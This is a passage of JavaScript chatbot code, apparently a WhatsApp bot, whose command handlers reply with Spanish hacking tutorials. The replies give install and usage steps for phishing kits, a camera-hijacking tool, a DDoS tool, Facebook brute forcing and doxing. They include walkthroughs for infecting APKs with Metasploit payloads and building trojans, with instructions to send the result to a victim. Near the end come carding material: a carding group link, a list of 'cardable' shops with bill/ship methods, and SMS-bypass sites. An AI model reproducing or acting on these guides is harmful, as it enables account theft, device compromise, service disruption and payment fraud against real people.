                  reply(`📲PhoneInfoga📲

🌎 PhoneInfoga es una de las herramientas más avanzadas para escanear números de teléfono internacionales utilizando solo recursos gratuitos. Le permite recopilar primero información estándar como país, área, operador y tipo de línea en cualquier número de teléfono internacional. Luego, busque huellas en los motores de búsqueda para tratar de encontrar el proveedor de VoIP o identificar al propietario. 🌎

📲Instalación:📲

$ pkg upgrede -y && pkg update -y
$ pkg install -y python git
$ git clone https://github.com/sundowndev/PhoneInfoga
$ ls
$ cd PhoneInfoga
$ mv config.example.py config.py
$ ls
$ chmod 777 config.py config.py
$ python3 -m pip install -r requirements.txt
$ python3 phoneinfoga.py -v
$ python3 phoneinfoga.py -n
$ cp -rf ../usr/bin/ngrok $HOME/PhoneInfoga`)
                  }
			
	if (budy.includes(`/fotosploit`)) {
                  reply(`📲¿Qué es FotoSploit?📲

🌐 FotoSploit es una herramienta que se especializa en la ingenieria social, Esta herramienta permite al usuario que la utilice, subir una imágen a un enlace phishing, por lo tanto, será mas probable que la víctima acceda al enlace si ve una imágen que le llame la atención. 🌐

📲INSTALACIÓN DE FotoSploit EN TERMUX (ANDROID)📲

$ apt update && apt upgrade -y
$ termux-setup-storage
$ pkg install -y git
$ git clone https://github.com/Cesar-Hack-Gray/FotoSploit
$ cd FotoSploit
$ bash install.sh
$ ./FotoSploit

Show options

set foto /sdcard/foto.jpg
[RUTA DE TÚ FOTO]

set title url 
[TÍTULO DEL VIDEO]

set mini title 
[DESCRIPCIÓN DEL VIDEO]

set view 
[VISTA DE LA FOTO]

set red social 
[RED SOCIAL PHISHING]

run
[COMIENZA A GENERAR EL ENLACE]

Envía el enlace a tú víctima.`)
                  }
			
	if (budy.includes(`/sqlmap`)) {
                  reply(`💉Sqlmap es una herramienta de prueba de penetración de código abierto que automatiza el proceso de detección y explotación Defectos de inyección SQL y apoderamiento de servidores de bases de datos. Viene con un potente motor de detección, muchas funciones de nicho. para el mejor probador de penetración y una amplia gama de cambios que duran desde la toma de huellas digitales de la base de datos, hasta la obtención de datos de la base de datos, para acceder al sistema de archivos subyacente y ejecutar comandos en el sistema operativo a través de conexiones fuera de banda..💉

🔒Installation:📲

$ apt update && apt upgrade
$ apt install git 
$ apt install python2
$ apt install python
$ git clone https://github.com/sqlmapproject/sqlmap
$ cd sqlmap
$ chmod +x *

📲Run:📲

$ python2 sqlmap.py -h

It shows all options to use this tool sqlmap

$ python2 sqlmap.py`)
                  }
			
	if (budy.includes(`/bingen`)) {
                  reply(`📱Bingen📱

💵 *Es una herramienta cuya funcion es generar bins mediante un algoritmo avanzado de generacion
se estas.* 💵

💵 Un bin es utilizado como una forma para la generacion de tarjeras de credito validas. Con el cual puedes obtener servicios premium. 💵

https://github.com/JoeTech-Studio/Bingen.git`)
                  }
			
	if (budy.includes(`/socialsploit`)) {
                  reply(`📱SocialSploit es un framework de phishing que nos ayuda a hackear con ngrok y serveo📱

📱Installation:📱

$ pkg install -y git 
$ git clone https://github.com/Cesar-Hack-Gray/SocialSploit
$  cd SocialSploit 
$  ls
$ bash install.sh
$ ./Sploit`)
                  }
			
	if (budy.includes(`/grabscam`)) {
                  reply(`📲GrabCam📲

🔒 Piratería de cámaras por herramienta de enlace. Es un script basado en bash que está hecho oficialmente para termux a partir de esta herramienta que puede hackear la cámara de tu víctima con una simple página de oferta. Esta herramienta funciona tanto en dispositivos Android rooteados como en dispositivos Android no rooteados. 🔒

📲Instalación📲

$ apt-get update
$ apt-get upgrade
$ pkg install python 
$ pkg install python2
$ pkg install git
$ pip install lolcat
$ git clone https://github.com/noob-hackers/grabcam
$ ls
$ cd grabcam
$ ls
$ bash grabcam.sh
Hackear micrófono android,ios ,pc.*`)
                  }
			
	if (budy.includes(`/hammer`)) {
                  reply(`📱¿Que es Hammer?📱

💉Que es DDoS y Como funciona¿?💉

Los ataques de red distribuidos a menudo se conocen como ataques de denegación distribuida de servicio (DDoS), El ataque DDoS envía varias solicitudes al recurso web atacado, con la intención de desbordar la capacidad del sitio web para administrar varias solicitudes y de evitar que este funcione correctamente.

📱Instalacion:📱

$ pkg install -y git
$ pkg install -y python
$ pkg install -y python2
$ pkg install -y nmap
$ pkg install net-tools
$ git clone https://github.com/cyweb/hammer
$ cd hammer

💻USO CORRECTO:💻

Primero sacamos la ip del sitio web 

ping sitio sin http o https

python hammer -s IP  -p 80 -t 135

Es .py pero facebook bloquea si lo pongo correctamente

( -s ) Sirve para indicar la IP del sitio web de la víctima.

( -p ) Sirve para indicar el puerto que atacaremos, en éste caso el puerto mas recomendado y por defecto es 80.

( -t ) Sirve para indicar la velocidad en la cual se enviarán los paquetes, en éste caso la velocidad mas recomendada y por defecto es 135`)
                  }
			
	if (budy.includes(`/kali-nethunter`)) {
                  reply(`📱¿Que es Kali-Nethunter?📱

Este es un script mediante el cual puede instalar Kali nethunter (Kali Linux) en su aplicación termux sin un teléfono rooteado.

📱Installation:📱

$ apt update 
$ apt upgrade
$ apt install git
$ git clone https://github.com/Hax4us/Nethunter-In-Termux
$ cd Nethunter-In-Termux
$ chmod +x *
$ ./kalinethunter

Now select your architecture 

Now type this command to start 

$ startkali
Compulsory Steps For First Time Use

So after startkali

execute this command

$ apt-key adv --keyserver hkp://keys.gnupg.net --recv-keys 7D8D0BF6

Now its time to update

$ apt-get update`)
                  }
			
	if (budy.includes(`/cupp`)) {
                  reply(`📱¿Qué es cupp?📱

cupp es una herramienta que nos permite generar diccionarios con información de personas, generalmente esta herramienta se usa para los ataques de fuerza bruta.

📱INSTALACIÓN DE cupp EN TERMUX (ANDROID)📱

$ apt update && apt upgrade -y
$ termux-setup-storage
$ pkg install -y git
$ pkg install -y python
$ pkg install -y python2
$ git clone https://github.com/Mebus/cupp.git
$ cd cupp
$ ./cupp.py
$ ./cupp.py -i

Muy bien, aquí debes escribir la información de la víctima, entre mas información es mejor, ya que tu diccionario tendra mas posibilidades de crear una contraseña correcta, EJEMPLO:

Primer Nombre: Termux
Apellido : Hacking
Apodo: Error404
Cumpleaños: 25121996
Novi@: 
apodo novi@:
Cumpleaños novia:
Nombre hijo:
Apodo hijo:
Cumpleaños hijo:
Nombre de mascota:
Trabajo/Escuela/Compania:

¿Agregar palabras claves? [Y/N]: y
ejemplo: rock, basket, computadora, rojo

¿agregar caracteres? [Y/N]: y
¿agregar números? [Y/N]: y
¿agregar letras? [Y/N]: y

Diccionario creado como >> ejemplo.txt

PARA LEER EL DICCIONARIO ESCRIBIMOS EL COMANDO: cat ejemplo.txt`)
                  }
			
	if (budy.includes(`/infectador-framework`)) {
                  reply(`📲 infectador-framework 📲

Es un script que te permite infectar apks legítimas con 6 payloads diferentes a elejir los comandos para instalar el script son:

$ apt update && apte upgrade -y 
$ pkg install -y git 
$ git clone https://github.com/Cesar-Hack-Gray/infectador-framework 
$ cd infectador-framework 
$ ls 
$ bash setup 

Esta parte tardará un poco solo esperen a que se instalen los paquetes necesarios para el script Ya cuendo aya terminado de descargar todos los paquetes ejecutan el script con:

$ ./Infectador Apreten enter 

Elijen el payload que quieran usar para infectar el apk poniendo el número que tenga detrás el payload

 Aquí ponen la ruta del apk legítima que quieren infectar por ejemplo si la apk se encuentra en descargas y se llama Base.apk la ruta sería: 

$ /sdcard/Download/Base.apk

 Ojo eso es un ejemplo ustedes ponen la ruta de dónde se encuentre el apk con su respectivo nombre

Aquí pondrán su IP, para saber cuál es su IP pueden abrir otra sesión y escribir *ifconfig ahíh buscan su IP y la pegan en la sesión del infectador Aquí ponen el puerto de su preferencia Aquí le elijen un nuevo nombre al apk Aquí apretan "Y" y le dan a enter Ya se estaría infectando el apk legítima solo deben esperar Ya cuendo aya terminado de infectar el apk elijen la opción 2 es lo más recomendable Bueno aquí les pedirá iniciar metasploit ustedes apretan "Y" le dan a enter y le dan devuelta a "Y",metasploit se estaría conectando con el apk infectada El apk infectada se les guardará en la carpeta de infectador-framework solo deben ingresar a la carpeta y mover el apk infectada a HOME ya solo queda mandar el apk infectada a la víctima*`)
                  }
			
	if (budy.includes(`/evil-create-framework`)) {
                  reply(`📱 CREAR TROYANO 📱

📱Instalación 📱

$ pkg update
$ pkg upgrade
$ pkg install git
$ pkg install python2
$ git clone https://github.com/LOoLzeC/Evil-create-framework
$ ls
$ cd Evil-create-framework
$ ls
$ chmod +x vcrt.py
$ python2 vcrt.py

help

show android

create virus/y aquí elegimos el virus

SET OUTPUT /sdcard

SET NAME VIRUS (y le ponemos un nombre)

go`)
                  }
			
	if (budy.includes(`/weeman`)) {
                  reply(`📱¿Qué es weeman?📱

weeman es una herramienta que copia el código html de una página web a tu elección, y crea un enlace phishing con dichos datos.

📱INSTALACIÓN DE weeman EN TERMUX (ANDROID)📱

EJECUTAR UNA SESIÓN DE ngrok

ngrok tcp 4444

ABRIR UNA NUEVA SESIÓN EN TERMUX...

apt update && apt upgrade -y
$ termux-setup-storage
$ pkg install -y python
$ pkg install -y python2
$ pkg install -y git
$ git clone https://github.com/evait-security/weeman
$ cd weeman
$ chmod 777 weeman.py
$ python2 weeman.py

CON ESTO YA TIENES INSTALADO weeman EN TERMUX, A CONTINUACIÓN TE MOSTRARE UN EJEMPLO DE COMO USARLO...

show options

set url https://m.facebook.com
[Página a clonar]

set port 4444
[Puerto usado en ngrok]

set action_url https://www.google.com
[Página de redirección]

run
[Comenzar]

AQUÍ SE ALMACENARAN LOS DATOS DE LA VÍCTIMA, PARA ELLO TIENES QUE ENVIAR EL LINK QUE ESTA EN TU SESIÓN DE NGROK.`)
                  }
					
		if (budy.includes(`/fuerza bruta facebook`)) {
                  reply(`📲ATAQUES DE FUERZA BRUTA A LA RED SOCIAL "FACEBOOK" EN TERMUX (ANDROID)📲

📲¿Qué es fuerza bruta?📲

La fuerza bruta en el ámbito de la informática, es un método hacking en el cual, el atacante intenta descifrar la contraseña de su víctima por medio de una combinación de contraseñas generadas con información recopilada de esta misma.


✅REQUISITOS✅

☑️ Aplicación Termux
☑️ Navegador Chrome
☑️ Perfil de Facebook (Víctima)


Ahora que ya tenemos los requisitos, comenzamos con la instalación:

$ apt update && apt upgrade -y
$ termux-setup-storage
$ apt install -y python
$ apt install -y python2
$ apt install -y python2-dev
$ apt install pip2
$ pip2 install mechanize
$ apt  install -y git
$ git clone https://github.com/perjayro/Facebook_brute.git
$ cd Facebook_brute
$ chmod +x brute.py
$ python2 brute.py

EL ID de la víctima

CONTRASEÑA
pass.txt
pass1.txt
pass2.txt
pass3.txt`)
                  }
					
		if (budy.includes(`/wiki-termux`)) {
                  reply(`🌎¿Qué es Wiki-Termux?🌎

wiki-termux, como su nombre lo dice, es una guía o manual que contiene información acerca del uso de Termux y de algunas herramientas que son compatibles con ésta terminal.

📱INSTALACIÓN DE wiki-termux EN TERMUX (ANDROID)📱

$ apt update && apt upgrade -y
$ termux-setup-storage
$ pkg install -y git
$ git clone https://github.com/HarrisSec/wiki-termux
$ cd wiki-termux
$ chmod 711 wiki
$ ./wiki`)
                  }
					
		if (budy.includes(`/t-phish`)) {
                  reply(`📲¿Qué es T-Phish?📲

T-Phish es una herramienta de phishing excelente y muy útil para usuarios móviles. Esta es una herramienta modificada

📱Guía de instalación y uso📱

$ apt-get update -y
$ apt-get upgrade -y
$ pkg install git -y
$ git clon https://github.com/Stephin-Franklin/T-Phish
$ ls
$ cd T-Phish
$ ls
$ descomprimir T-Phish
$ cd T-Phish
$ descomprimir T-Phish.zip
$ chmod 777 start.sh
$ ./start.sh
$ ./phish.sh`)
                  }
					
		if (budy.includes(`/red_hawk`)) {
                  reply(`📲Red_Hawk📲

Todo en una herramienta para recopilar información, escanear y rastrear vulnerabilidades. Una herramienta imprescindible para todos los probadores de penetración.

📱La Instalación la encontrarán en github📱

https://github.com/Tuhinshubhra/RED_HAWK`)
                  }
					
		if (budy.includes(`/doxweb`)) {
                  reply(`📲¿Qué es DoxWeb?📲

DoxWeb es una herramienta que utiliza diversos sitios web para recopilar información de un usuario, es decir, es una herramienta de Doxing.

📲INSTALACIÓN DE DoxWeb EN TERMUX (ANDROID)📲 

$ termux-setup-storage?
$ apt update && apt upgrade -y
$ termux-setup-storage
$ pkg install -y git
$ git clone https://github.com/TermuxHacking000/DoxWeb
$ cd DoxWeb
$ chmod 711 DoxWeb.sh
$ ./DoxWeb.sh`)
                  }
					
		if (budy.includes(`/recon-spider`)) {
                  reply(`📲ReconSpider📲

ReconSpider es el marco más avanzado de inteligencia de código abierto (OSINT) para escanear direcciones IP, correos electrónicos, sitios web, organizaciones y obtener información de diferentes fuentes.

🔒ReconSpider puede ser utilizado por investigadores de Infosec, probadores de penetración, cazadores de insectos e investigadores de delitos cibernéticos para encontrar información detallada sobre su objetivo.🔒

📲ReconSpider agrega todos los datos sin procesar, los visualiza en un tablero y facilita la alerta y el monitoreo de los datos.📲

🌎Recon Spider también combina las capacidades de Wave , Photon y Recon Dog para hacer una enumeración completa de la superficie de ataque.🌎


Descripción general de la herramienta:
Realiza escaneo OSINT en una dirección IP, correos electrónicos, sitios web, organizaciones y descubre información de diferentes fuentes.
Correlaciona y colabora los resultados, muéstralos de manera consolidada.
Utilice un script específico / inicie OSINT automatizado para datos consolidados.
Actualmente disponible solo en la interfaz de línea de comandos (CLI).


Configuración del entorno (sistema operativo Linux)
Paso 1: Clonación de ReconSpider en su sistema Linux.

Para descargar ReconSpider, simplemente clone el repositorio de github. A continuación se muestra el comando que puede utilizar para clonar el repositorio de ReconSpider.

git clone https://github.com/bhavsec/reconspider.git
Paso 2: asegúrese de que python3 y python3-pip estén instalados en su sistema.

También puede realizar una verificación escribiendo este comando en su terminal.

sudo apt install python3 python3-pip
Paso 3: instalación de todas las dependencias.

Una vez que clone y verifique la instalación de Python, encontrará el nombre del directorio como reconspider . Simplemente vaya a ese directorio e instálelo usando estos comandos:

cd reconspider
sudo python3 setup.py install`)
                  }
					
		if (budy.includes(`/fsociety`)) {
                  reply(`📲Fsociety📲

Un marco de prueba de penetración, tendrá todos los scripts que necesita un pirata informático. Funciona con Python 2. Para obtener una versión de Python 3, consulte nuestra versión actualizada en fsociety-team/fsociety.

📲Instalación 📲

$ pkg install git
$ git clone https://github.com/Manisso/fsociety.git
$ cd fsociety && ls
$ chmod +x fsociety.py
$ python2 fsociety.py`)
                  }
					
		if (budy.includes(`/fbi`)) {
                  reply(`📲¿Qué es Fbi?📲

🔒 fbi (facebook information) es un herramienta de información gathering precisa de una cuenta de Facebook. Toda la información confidencial se puede recopilar fácilmente a pesar de que el objetivo/víctima convierta toda su privacidad a (solo para mí), información confidencial sobre residencia, fecha de nacimiento, ocupación, número de teléfono y dirección de correo electrónico. 🔒

🔒INSTALACIÓN DE fbi EN TERMUX (ANDROID)🔒

$ apt update && apt upgrade -y
$ termux-setup-storage
$ pkg install -y git
$ pkg install -y python
$ pkg install -y python2
$ git clone https://github.com/xHak9x/fbi.git
$ cd fbi
$ pip2 install -r requirements.txt
$ python2 fbi.py

token

ESCRIBIR TU CUENTA DE FACEBOOK

python2 fbi.py

get_data

help`)
                  }
					
		if (budy.includes(`/seeker`)) {
                  reply(`📲¿Qué es Seeker?📲

🌐Seeker aloja un sitio web falso en un servidor php y usa serveo para generar un enlace que reenviaremos al objetivo, el sitio web solicita permiso de ubicación y, si el objetivo lo permite, podemos obtener:🌐

[Longitud], [Latitud], [Exactitud], [Altitud], [Dirección], [Velocidad]

Junto con la información de ubicación, también obtenemos información del dispositivo sin ningún permiso:

[Sistema operativo], [Plataforma], [Número de núcleos de CPU], [Cantidad de RAM - Resultados aproximados], [Resolución de la pantalla], [Información de la GPU], [Nombre y versión del navegador], [Dirección IP pública], [Reconocimiento de direcciones IP].

📱INSTALACIÓN DE seeker EN TERMUX (ANDROID)📱

$ apt update && apt upgrade -y
$ termux-setup-storage
$ pkg install -y git
$ pkg install -y python
$ pkg install -y python2
$ pkg install -y openssh
$ pkg install -y php
$ git clone https://github.com/thewhiteh4t/seeker
$ cd seeker
$ python seeker.py`)
                  }
					
		if (budy.includes(`/aiophish`)) {
                  reply(`📱¿Qué es AIOPhish?📱

AIOPhish es una herramienta de phishing con 40 plantillas preconfiguradas, además, se especializa en la ingenieria social, ya que, nos brinda la opción de añadir una imagen, título y descripción al enlace y de ésta forma aumentar las probabilidades de que nuestra víctima acceda al enlace, puedes elegir el túnel y como extra tiene su respectivo menu de ayuda con un acortador de URL.

📱INSTALACIÓN DE AIOPhish EN TERMUX (ANDROID)📱

$ apt update && apt upgrade -y
$ termux-setup-storage
$ pkg install -y git
$ git clone https://github.com/kepxy/AIOPhish
$ cd STP
$ bash install-termux.sh
$ bash aiophish.sh`)
                  }
					
		if (budy.includes(`/funlett`)) {
                  reply(`📲¿Qué es Funlett?📲

Funlett es una herramienta que nos permite crear banners de texto automáticamente, tiene 38 tipos de letra, y 8 colores los cuales puedes seleccionar a tu gusto, además, también puedes crear un script con el banner de texto que hayas seleccionado.

📲INSTALACIÓN DE Funlett EN TERMUX📲

$ apt update && apt upgrade -y
$ termux-setup-storage
$ pkg install -y git
$ git clone https://github.com/TermuxHacking000/Funlett
$ cd Funlett
$ chmod 711 install.sh
$ ./install.sh
$ ./Funlett.sh`)
                  }
					
		if (budy.includes(`/termux-ubuntu`)) {
                  reply(`📱Termux ubuntu📱

termux-ubuntu es Un script para instalar Ubuntu Chroot en Termux.

📲Instalación 📲

$ apt update && apt upgrade 
$ apt install git 
$ apt install proot 
$ apt install wget 
$ git clone https://github.com/Neo-Oli/termux-ubuntu 
$ cd termux-ubuntu 
$ ls 
$ chmod + x * 
$ sh ubuntu.sh

📲Correr : 📲
Después de ejecutarlo, puede ejecutar [start-ubuntu.sh] para cambiar a su ubuntu $ ./start.sh Ahora estás en la terminal de Ubuntu`)
                  }
					
		if (budy.includes(`/termux-ubuntu`)) {
                  reply(`📱Termux ubuntu📱

termux-ubuntu es Un script para instalar Ubuntu Chroot en Termux.

📲Instalación 📲

$ apt update && apt upgrade 
$ apt install git 
$ apt install proot 
$ apt install wget 
$ git clone https://github.com/Neo-Oli/termux-ubuntu 
$ cd termux-ubuntu 
$ ls 
$ chmod + x * 
$ sh ubuntu.sh

📲Correr : 📲
Después de ejecutarlo, puede ejecutar [start-ubuntu.sh] para cambiar a su ubuntu $ ./start.sh Ahora estás en la terminal de Ubuntu`)
                  }
					
		if (budy.includes(`/ip-tracer`)) {
                  reply(`📱¿Que es IP Tracer?📱
≪━─━─━─━─◈─━─━─━─━≫

IP-Tracer se utiliza para rastrear una dirección IP. IP-Tracer está desarrollado para sistemas basados ​​en Termux y Linux. puede recuperar fácilmente la información de la dirección IP utilizando IP-Tracer. IP-Tracer usa ip-api para rastrear la dirección IP.

🌎Instalación 🌎

$ apt upgrade
$ apt install git
$ git clone https://github.com/rajkumardusad/IP-Tracer
$ cd IP-Tracer
$ chmod +x install
$ sh install o ./install

*Listo ahora tomen una IP despues seleccionamos la opcion 1 del menu. Utilizaremos la primera en este caso y te dara toda la informacion de ubicación`)
                  }
					
		if (budy.includes(`/golismero`)) {
                  reply(`📱¿Que es GoLismero? 📱

GoLismero es un marco de código abierto para pruebas de seguridad. Actualmente está orientado a la seguridad web, pero se puede expandir fácilmente a otros tipos de análisis.

🌎Las características más interesantes del marco son:🌎

✓Independencia real de la plataforma. Probado en Windows, Linux, * BSD y OS X.

✓Sin dependencias de bibliotecas nativas. Todo el marco se ha escrito en Python puro.

✓Buen rendimiento en comparación con otros marcos escritos en Python y otros lenguajes de scripting.

✓Muy facil de usar.

✓El desarrollo de complementos es extremadamente simple.

✓El framework también recopila y unifica los resultados de herramientas conocidas: sqlmap, xsser, openvas, dnsrecon, theharvester ...

✓Integración con estándares: CWE, CVE y OWASP.

✓Diseñado para la implementación de clústeres en mente (aún no disponible).

📲 Instalación: 📲

Los siguientes comandos descargarán e instalarán GoLismero en su sistema. Esto requiere privilegios de root, por lo que se le pedirá su contraseña cuando ejecute el primer comando.

$ sudo bash apt-get install python2.7 python2.7-dev python-pip python-docutils git perl nmap sslscan 
$ cd /opt 
$ git clone https://github.com/golismero/golismero.git 
$ cd golismero 
$ pip install -r requirements.txt 
$ pip install -r requirements_unix.txt 
$ ln -s ${PWD}/golismero.py /usr/bin/golismero 
$ exit`)
                  }
					
		if (budy.includes(`/angryfuzzer`)) {
                  reply(`📲 ¿Que Es AngryFuzzer? 📲

AngryFuzz3r es una colección de herramientas de pentesting para recopilar información y descubrir vulnerabilidades de los objetivos basados ​​en el proyecto Fuzzedb.

✓Descubra archivos y directorios ocultos en un servidor web.

✓La aplicación intenta encontrar rutas relativas de URL de el sitio web dado comparándolos con un conjunto dado.

✓Caracteristicas Fuzz url establecida desde un archivo de entrada Búsqueda de ruta relativa

✓concurrente Número configurable de trabajadores difusos Fuzz CMS ==> Wordpress, Durpal, Joomla Generar informes de las rutas válidas.


📱INSTALACIÓN📱

$ apt update && apt upgrade
$ apt install git 
$ apt install python2
$ apt install python
$ git clone https://github.com/ihebski/angryFuzzer 
$ cd angryFuzzer 
$ sudo pip install -r requirements.txt
$ chmod +x *
$ python angryfuzzer.py

📲 Uso :📲

$ python2 angryFuzzer.py -h

It shows all options of this tool

$ python2 angryFuzzer.py -u http:site.com

Ahora comienza a recopilar información de destino ...`)
                  }
					
		if (budy.includes(`/recon-dog`)) {
                  reply(`💻Recon-Dog💻

✓Asistente + interfaz CLA

✓Puede extraer objetivos de STDIN (entrada canalizada) y actuar sobre ellos

✓Toda la información se extrae con API, no se hace contacto directo con el objetivo

📲Installaion :📲

$ apt update && apt upgrade

$ apt install git 

$ apt install python2

$ git clone https://github.com/UltimateHackers/ReconDog

$ cd ReconDog

$ chmod +x *

📲Uso:📲

python2 dog.py

La interfaz del asistente es la forma más sencilla en la que puede usar Recon Dog. Simplemente ejecute el programa, seleccione lo que desea hacer e ingrese el objetivo, es así de simple.`)
                  }
					
		if (budy.includes(`/darkfly-tool`)) {
                  reply(`🌐DarkFly-Tool🌐

DarkFly-Tool es una herramienta de instalación para instalar herramientas. esta herramienta te lo pone fácil. por lo que no es necesario escribir git clone o buscar el repositorio de github. Solo tienes que elegir el número. qué herramienta desea instalar. hay 530 herramientas listas para instalar. y para aquellos a los que les gusta divertirse. hay 7 herramientas de spam de SMS que están listas para usar, solo necesita elegir spam para usar el número de destino. hay una DLL de tocopedia

📲Instalación: 📲

$ pkg install python2
$ pkg install git
$ git clone https://github.com/Ranginang67/DarkFly-Tool
$ cd DarkFly-Tool
$ chmod 777 install.py
$ python2 install.py
run`)
                  }
					
		if (budy.includes(`/sherlock`)) {
                  reply(`📲¿Qué es sherlock?📲

sherlock es una herramienta que busca cuentas en redes sociales a través de un nombre de usuario de nuestra elección.

📲INSTALACIÓN DE sherlock EN TERMUX (ANDROID)📲

$ apt update && apt upgrade -y
$ termux-setup-storage
$ pkg install -y git
$ pkg install -y python
$ pkg install -y python2
$ git clone https://github.com/sherlock-project/sherlock
$ cd sherlock
$ python -m pip install -r requirements.txt
$ cd sherlock
$ python sherlock.py NombreDeUsuario

📲Uso📲

$ python3 sherlock --help`)
                  }
					
		if (budy.includes(`/evilurl`)) {
                  reply(`📲¿Qué es EvilURL?📲

EvilURL es una herramienta que genera dominios maliciosos unicode para IDN Homograph Attack y también para detectar éstos dominios maliciosos.

📱INSTALACIÓN DE EvilUrl EN TERMUX (ANDROID)📱

$ apt update && apt upgrade -y
$ termux-setup-storage
$ pkg install -y git
$ pkg install -y python
$ pkg install -y python2
$ git clone https://github.com/UndeadSec/EvilURL
$ cd EvilURL
$ python evilurl.py`)
                  }
					
		if (budy.includes(`/falsify`)) {
                  reply(`📱¿Qué es Falsify?📱

🌐 Falsify es una herramienta de phishing con 8 plantillas de redes sociales y la opción de enviar un correo de gmail falso, suplantando la identidad de Facebook para obtener las credenciales del objetivo. 🌐

📱INSTALACIÓN DE Falsify EN TERMUX (ANDROID)📱

$ apt update && apt upgrade -y
$ termux-setup-storage
$ pkg install -y git
$ git clone https://github.com/TermuxHacking000/Falsify
$ cd Falsify
$ chmod 711 install.sh
$ ./install.sh
$ ./Falsify.sh`)
                  }
					
		if (budy.includes(`/syso-termux`)) {
                  reply(`📲¿Qué es SysO-Termux?📲

SysO-Termux, con sus siglas, "Termux Operating System", es un instalador de paquetes, herramientas y frameworks, específicamente para "Termux", con el fin de simular la fantasía de tener un "Sistema Operativo" dentro de "Termux" (aunque no lo sea), además, incluye un banner, una shell diferente conocida como "fish", un teclado adicional, un login con "user" y "password" a elección del usuario y una interfaz de color verde, referente al hacking ético con Termux.

✅ Instalador completo de SysO-Termux con un tamaño de 4.00 GB.

✅ Menú para seleccionar la herramienta a instalar por separado.

✅ Instalador de paquetes básicos en Termux.

✅ Login con usuario y contraseña predefinidos por el usuario instalador.

✅ Comandos exclusivos de SysO-Termux para automatizar procesos en Termux.

✅ Una shell que autocompleta los comandos escritos anteriormente (fish).

✅ Menu de ayuda de los comandos exclusivos de SysO-Termux.

✅ Interfaz de color verde con blanco, referente al hacking ético con Termux.

📱INSTALACIÓN DE SysO-Termux EN TERMUX (ANDROID)📱

$ apt update && apt upgrade -y
$ termux-setup-storage
$ pkg install -y git
$ git clone https://github.com/TermuxHacking000/SysO-Termux
$ cd SysO-Termux
$ chmod 711 install.sh
$ ./install.sh

📲COMANDO DE ACTUALIZACIÓN📲

$ ./SysO-Update.sh`)
                  }
					
		if (budy.includes(`/kickthemoutprojet`)) {
                  reply(`📲¿Qué es kickthemout?📲

Una herramienta para expulsar dispositivos de su red y disfrutar de todo el ancho de banda para usted. Le permite seleccionar dispositivos específicos o todos y ARP los falsifica fuera de su red de área local.

📲INSTALACIÓN DE kickthemout EN TERMUX (ANDROID ROOT)🌐

$ apt update && apt upgrade -y
$ termux-setup-storage
$ pkg install -y git
$ pkg install -y nmap
$ pkg install -y python
$ pkg install -y python2
$ git clone https://github.com/k4m4/kickthemout.git
$ cd kickthemout
$ python -m pip install -r requirements.txt
$ sudo python kickthemout.py

Escribir la puerta de enlace del router al que estas conectado, ejemplo:

192.168.1.1

Seleccionar la opción número "3" y pulsar enter`)
                  }
					
		if (budy.includes(`/grupo oficial`)) {
                  reply(`◾️Bineria Universal - Grupo Oficial

◾️Contenido: Carding - Binning

◽Bins
◽Lives
◽Métodos
◽Tutoriales
◽Cosas Extras

◾️Aprenderás A Sacar Todo Tipo De Cuentas

◽Disney+
◽HboMax
◽Stars+
◽Paramount+
◽Acorntv
◽Prime Video
◽Netflix (aveces)
◽Crunchyroll
◽Funimation
◽Hulu
◽Spotify
◽Deezer
◽Napster
◽Tidal
◽Twitch
◽IpVanish
◽Open English
◽Duolingo Plus
◽Onlyfans
◽NordVpn
◽ExpressVpn
◽Fanatiz
◽FútboTv
◽Apple Music
◽PayPal
◽Canva
◽TunnelBear
◽Hootsuite
◽Noggin

◾️Link: https://chat.whatsapp.com/BDbc6xaTFEZ5zvgT8yH2Bl

◾️Nota:

◽El Grupo Se Creo con La Intención De Compartir Conocimiento,Métodos y Bins Funcionales.

◽No Enlaces - Spam - Presumir.

◽Contamos Con Un Bot De Autoayuda.

◽También sorteamos Números Para WhatsApp y Cuentas Premiun.

◽Porfavor Respetar Las Reglas Del Grupo y Disfrutar Tu Estadía.`)
                  }
					
		if (budy.includes(`/sitios cardeables`)) {
                  reply(`Sitios cardeables 2021

games STEAM :
www.gamecards.com
www.instant-gaming.com
www.kinguin.net -> Skrill
www.getgamesgo.com
www.bundlestars.com -> It's a very very good site
www.dlgamer.us
www.yuplay.com
www.elitekeys.com
www.gog.com
www.offgamers.com
www.gamersgate.com
www.go2arena.com
Method : You must have a good card and work GOOD LUCK



Website: www.scufgaming.com
Items: Xbox Controllers
Method: Bill=Ship
Shipping: Worldwide

Website: www.hollisterco.com
Items: Clothing
Method: Bill=Ship
Shipping: Worldwide

Website: www.littlecaesars.com
Items: Food Giftcard
Method: Bill=Ship
Shipping: USA

Website: www.tomtop.com
Items: Electronic
Method: Bill=Ship
Shipping: Worldwide


Website: www.steaknshake.com
Items: Food Giftcard
Method: Bill=Ship
Shipping: USA



website: www.abercrombie.com
Items: Clothing
Method: Bill=Ship
Shipping: Worldwide

Website: www.footlocker.com
Items: Clothing/Shoes
Method: Bill=Real, Ship=Your Drop

Shipping: Worldwide

Items: Clothing
Method: Bill=Ship
Shipping: Worldwide
Website: www.SOLRepublic.com

Items: HeadPhones
Method: Bill=Ship
Shipping: USA\Canada ONLY

https://skreened.com/
EASY/ CLOTHES

this is very cheap n easy to card
https://cheap-forex-vps.com/

GAME KEYS

mmoga.net
g2play.net
simplycdkeys.com
allcdkey.com
kinguin.net
humblebundle.com
gog.com
activision.com
eurotrucksimulator2.com
gamersgate.com
cdkeyhouse.com
gamekeystore.net
elitekeys.com
steampowered.com
cdkeys.com.au (easiest)


https://www.lasenza.com/ (.co.uk ships to UK, and does have vbv or msc)
Same bill+ship (Your drop address)
Does NOT have vbv or msc
Shipping to USA, and UK if using the co.uk domain
(for ladies, this is basically same quality as victoria secret)

https://www.agentprovocateur.com/ (This is basically the LV of women lingerie in the UK, you can card gift vouchers and sell for profit on eBay or local marketplace. - Use EU non-vbv/msc for best results)
Same bill+ship (Your drop address)
Does HAVE vbv and msc
Shipping Worldwide

https://www.ryanair.com/en (flight booking)
Cardholder billing + traveler name/details
Does NOT have vbv or msc
Use EU CCV for best result

www.yancor.com (Mens fashion/designer clothes.)
Pay through PayPal without VBV/MSC. Or through Skrill with VBV/MSC bypass with AMEX.
Use billing same as Card holder, sock5/vpn match country of card.
Recommended use Poland card`)
                  }
					
		if (budy.includes(`/sitios sms`)) {
                  reply(`🔰 SITIOS HQ PARA VERIFICACIÓN DE SMS DE BYPASS 🔰

 Ⓜ️ʀᴇᴄᴇɪᴠᴇ ᴀɴ sᴍs: https://receive-a-sms.com/
